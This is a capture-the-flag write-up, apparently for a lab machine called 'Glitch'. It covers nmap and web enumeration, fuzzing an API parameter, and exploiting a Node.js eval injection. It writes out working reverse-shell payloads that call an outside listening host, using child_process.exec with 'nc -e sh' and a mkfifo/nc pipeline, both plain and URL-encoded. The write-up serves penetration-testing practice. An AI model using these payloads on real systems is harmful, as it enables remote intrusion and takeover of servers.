# GLITCH

# Enumeration / nmap scan

```jsx
$  nmap -T5 -sC -sV -Pn 10.65.148.140                                                                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 10:35 EST                                                                
Nmap scan report for 10.65.148.140                                                                                             
Host is up (0.15s latency).                                                                                                    
Not shown: 999 filtered tcp ports (no-response)                                                                                
PORT   STATE SERVICE VERSION                                                                                                   
80/tcp open  http    nginx 1.14.0 (Ubuntu)                                                                                     
|_http-server-header: nginx/1.14.0 (Ubuntu)                                                                                    
|_http-title: not allowed                                                                                                      
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Web Enumeration

The web is blank:

```jsx
THe source code: 

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>
```

## Found the api:

```jsx
/api/access

and when we access it we found this token:

{"token":"dGhpc19pc19ub3RfcmVhbA=="} -> this_is_not_real

after seting the token i looked at the page and found another api:
/api/items

the enumerate with ffuf ->  api/items?FUZZ=anything

and found the cmd

cmd                     [Status: 200, Size: 25, Words: 2, Lines: 1, Duration: 141ms]

```

# Exploiting the api/items?cmd=anything

```jsx
$ curl -X POST http://10.65.148.140/api/items?cmd=ls                                                                         
<!DOCTYPE html>                                                                                                                
<html lang="en">                                                                                                               
<head>                                                                                                                         
<meta charset="utf-8">                                                                                                         
<title>Error</title>                                                                                                           
</head>                                                                                                                        
<body>                                                                                                                         
<pre>ReferenceError: ls is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonym
ous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request
] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/r
oute.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;a
t Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_m
odules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router
/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Funct
ion.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>                                                     
</body>     
```

There is node js runing so I thougt to make a node js revers shell:

```jsx
─$ curl -X POST "http://10.65.148.140/api/items?cmd=require%28%27child_process%27%29.exec%28%27nc%20-e%20sh%20192.168.135.247%209999%27%29"

vulnerability_exploited [object Object] 

And then this : 
$ curl -X POST \
  --data-urlencode "cmd=require('child_process').exec('nc -e sh 192.168.135.247 9999')" \
  http://10.65.148.140/api/items

{"message":"there_is_a_glitch_in_the_matrix"} 

SO i tryied this: url encode:
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.135.247 9999 /tmp/f')

require%28%22child%5Fprocess%22%29%2Eexec%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%20%7C%20nc%20192%2E168%2E135%2E247%209999%20%2Ftmp%2Ff%27%29

and got the revers shell
```